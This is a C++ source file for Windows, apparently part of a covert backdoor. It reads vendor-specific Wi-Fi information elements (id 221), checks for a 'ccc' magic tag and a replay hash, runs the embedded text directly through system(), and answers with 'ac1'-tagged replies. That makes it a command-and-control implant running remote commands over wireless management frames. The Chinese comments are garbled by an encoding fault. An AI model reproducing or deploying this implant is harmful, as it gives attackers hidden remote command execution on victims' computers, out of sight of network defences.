#include "stdafx.h"
#include "Action_1.h"
#include <windows.h>
#include "1.h"


Action_1::Action_1():Action_Abs(){
	set_sendInfo("COMMAND\0");
}


Action_1::~Action_1(){
}

void Action_1::set_sendInfo(char * infomation)
{
	char* magic_code = "ac1";	//!!!!����ʶ���ֶ�
	char *info = (char *)malloc(255);
	memset(info, '\0', 255);
	strncpy(info, magic_code,strlen(magic_code));
	if (strlen(infomation) <= 252) {
		strncpy(info+3, infomation, strlen(infomation));
		Action_Abs::set_sendInfo(info);
	}
	else {
		HLOG("��ERROR��Send Context len >252 !!!");
	}
	free(info);
}

bool Action_1::ResolutionCMD(char *pp, int total_size) {
	char* magic_code = "ccc";	//!!!!!����ʶ���ֶ�
	boolean ResolutionCmd_STATUS = false;

	while (total_size) {		//�������е�payload
		ie_data * ie = (struct ie_data *)pp;
		//HLOG("total_size:%d\n", total_size);
		//HLOG("ie  @ %x\n", &ie);
		//HLOG("id  @ %x: %d\n", &ie->id, ie->id);
		//HLOG("len @ %x: %d\n", &ie->len, ie->len);
		//HLOG("val @ %x: %s\n=========\n", &ie->val, ie->val);

		if ((int)ie->id == 221) {
			char *magic = (char *)&ie->val[0];//��λ�� ������Ϣλ��
			HLOG("��ȡ��val�е���Ϣ��%s \n", magic);//������Ϣ

			if (strncmp(magic, magic_code, strlen(magic_code)) == 0) {//У�������ֶ�

				char command[240] = { 0 };
				char hash_tmp[9] = { '\0' };
				strncpy(hash_tmp, magic + 3, 8);//��ȡhash
				if (strncmp(get_hash(), hash_tmp, 8) == 0) {
					HLOG("��WARNING��REAPTINGHASH : %s\n", get_hash());
					break;
				}
				else {
					set_hash(hash_tmp);
				}
				strncpy_s(command, magic + 11, ie->len - 11);
				HLOG("HASHֵ��%s\n", get_hash());
				HLOG("ִ�е����%s\n", command);//ִ������
				system(command);
				ResolutionCmd_STATUS = TRUE;
				//system("pause");
				//exit(1); //�˳�
				set_sendInfo(get_hash());
				
				break;
			}
		}
		pp += sizeof(struct ie_data) - 1 + (int)ie->len;
		total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;

	}//while
	return ResolutionCmd_STATUS;
}
